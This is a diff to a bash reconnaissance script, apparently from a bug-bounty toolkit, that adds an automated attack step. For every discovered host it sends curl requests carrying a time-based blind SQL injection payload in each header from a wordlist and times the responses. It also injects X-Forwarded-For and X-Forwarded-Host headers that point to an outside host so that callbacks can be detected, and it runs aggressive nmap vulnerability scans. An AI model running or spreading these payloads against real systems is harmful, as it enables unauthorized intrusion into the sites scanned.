@@ -166,6 +166,17 @@ subdomains(){
 	cat 1scrap$1.txt | httprobe | tee 6httprobe$1.txt
 	touch 7nmapvuln$1.txt
 	
+	echo -e "\e[32m\nDoing Curl to check headers...\033[0m"
+	echo "******** Checking headers for sqli... *********\r\n" > 9httprobeXOR$1.txt
+	cat 6httprobe$1.txt | while read url; do
+		echo "*** URL START: $url\r\n" >> 9httprobeXOR$1.txt
+		cat ~/tools/__diccionarios/headers.txt | while read head; do
+			curl -X GET -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -H 'User-Agent:' -I -L -w "REQUESTTIME:%{time_starttransfer}\r\n" --verbose $url >> 9httprobeXORsqli$1.txt
+		done
+		curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -I -L $url >> 9httprobeXORsqli$1.txt
+		curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -I -L $url >> 9httprobeXORsqli$1.txt
+	done
+	
 	echo -e "\e[32m\nDoing Nmap to check if alive...\033[0m"
 	nmap -sP -Pn -T5 -iL 1scrap$1.txt > 3nmap$1.txt < /dev/null 2>&1
 	egrep -o -h '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}' 3nmap$1.txt | sort -u > 4nmapips$1.txt
@@ -174,7 +185,7 @@ subdomains(){
 	echo -e "\e[32m********** Starting Port scanning... **********\033[0m"
 	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]
 	then
-		echo -e "\e[32mDoing Nmap to check for top 1000 port vulns...\033[0m"
+		echo -e "\e[32mDoing Nmap to check for top 2000 port vulns...\033[0m"
 		nmap -sS -Pn -T5 --data-length 35 --top-ports 2000 --script "vuln" -iL 4nmapips$1.txt > 7nmapvuln$1.txt < /dev/null 2>&1
 	fi
 	echo -e "\e[32mDoing Masscan...\033[0m"
